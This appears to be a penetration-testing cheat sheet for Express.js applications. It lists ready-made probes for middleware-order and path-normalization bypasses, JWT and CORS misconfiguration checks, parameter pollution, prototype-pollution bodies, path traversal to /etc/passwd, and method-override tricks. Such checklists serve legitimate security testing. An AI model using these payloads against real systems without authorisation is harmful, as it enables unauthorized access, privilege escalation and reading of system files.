<middleware_attacks>
<middleware_bypass>
{% raw %}
# Middleware ordering vulnerabilities

# If auth middleware comes after route handler:
app.get('/admin', adminHandler);  // No auth!
app.use(authMiddleware);  // Too late

# Route-specific middleware bypass
app.use('/api', rateLimiter);
// Attack via /API (case sensitivity)
// Attack via /api/ (trailing slash)
// Attack via /api// (double slash)

# Path normalization differences:
GET /api/../admin  # May bypass /api middleware
GET /api%2f..%2fadmin
GET /admin/..%2fapi/secret
{% endraw %}
</middleware_bypass>

<authentication_bypass>
{% raw %}
# JWT middleware bypass

# Missing Authorization header handling
GET /protected HTTP/1.1
# No Authorization header - does it fail open?

# Invalid token handling
Authorization: Bearer invalid
Authorization: Bearer null
Authorization: Bearer undefined
Authorization: 

# Algorithm confusion (if using jsonwebtoken)
# Change RS256 to HS256

# Token in different locations
?token=xxx
Cookie: token=xxx
X-Access-Token: xxx
{% endraw %}
</authentication_bypass>

<cors_misconfiguration>
{% raw %}
# CORS middleware testing

# Origin reflection
Origin: https://evil.com
# Check Access-Control-Allow-Origin response

# Null origin
Origin: null

# Subdomain bypass
Origin: https://evil.target.com

# Credentials with wild origin
# Access-Control-Allow-Credentials: true
# with Access-Control-Allow-Origin: *  (browser blocks, but backend issue)
{% endraw %}
</cors_misconfiguration>
</middleware_attacks>

<input_handling>
<parameter_pollution>
{% raw %}
# HTTP Parameter Pollution

# Express with qs parser:
?id=1&id=2
# req.query.id = ['1', '2']

# Bypass filters:
?role=user&role=admin
# If code checks role[0] or first value

# Array injection:
?id[]=1&id[]=2
?id[0]=1&id[1]=2

# Object injection (if using extended: true):
?config[admin]=true
?user[isAdmin]=true
?settings[debug]=true
{% endraw %}
</parameter_pollution>

<type_coercion>
{% raw %}
# Type confusion attacks

# String expected, array received:
?search=test        # Normal
?search[]=test      # Array - may cause errors or bypass

# Object injection:
?filter={"admin": true}
?filter[admin]=true

# Boolean confusion:
?active=true
?active=1
?active=yes

# Numeric injection:
?id=1
?id=1e9999  # Very large number
?id=NaN
?id=Infinity
{% endraw %}
</type_coercion>

<body_parser_vulnerabilities>
{% raw %}
# Body parser attacks

# JSON with prototype pollution:
{
  "__proto__": {"admin": true},
  "constructor": {"prototype": {"admin": true}}
}

# Large payload DoS:
# Send very large JSON body
# Check if limit is enforced

# Content-Type confusion:
Content-Type: application/json
{"key": "value"}

Content-Type: application/x-www-form-urlencoded
key=value

# Check which parser handles the request

# Multipart/form-data injection:
# File upload with path traversal
{% endraw %}
</body_parser_vulnerabilities>
</input_handling>

<route_vulnerabilities>
<route_parameter_injection>
{% raw %}
# Route parameter attacks

# Path traversal in params:
app.get('/files/:filename', ...)
GET /files/..%2f..%2f..%2fetc/passwd
GET /files/....//....//etc/passwd

# Regex bypass:
app.get('/users/:id(\\d+)', ...)
# Only numeric IDs, but test encoding:
GET /users/1%00abc

# Optional parameters:
app.get('/users/:id?', ...)
GET /users/        # Empty ID handling

# Multiple params:
app.get('/users/:userId/posts/:postId', ...)
GET /users/victim_id/posts/any_post
{% endraw %}
</route_parameter_injection>

<method_override>
{% raw %}
# HTTP method override (if method-override middleware used)

POST /api/users/1 HTTP/1.1
X-HTTP-Method-Override: DELETE

# Or query parameter:
POST /api/users/1?_method=DELETE

# Or header variations:
X-HTTP-Method: DELETE
X-Method-Override: DELETE
{% endraw %}
</method_override>
</route_vulnerabilities>

